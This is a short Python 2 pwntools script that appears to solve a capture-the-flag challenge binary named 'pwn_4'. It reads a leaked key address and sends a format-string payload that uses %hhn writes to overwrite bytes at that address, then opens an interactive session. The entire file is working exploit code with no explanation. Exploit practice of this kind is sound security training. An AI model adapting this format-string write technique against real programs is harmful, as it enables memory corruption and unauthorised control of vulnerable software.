#! /usr/bin/env python2
#coding:utf-8

from pwn import *

context.log_level = 'debug'

def pwn():
    p = process('./pwn_4')
    p.recvuntil('give me the key!')
    key_address = int(p.recvuntil("\n")[:-1],16)
    log.success("key_address="+hex(key_address)) 
    # gdb.attach(p)
    # pause()
    payload = p32(key_address)+p32(key_address+1)+" %.43x%7$hhn"+" %.221x%8$hhn"
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    pwn()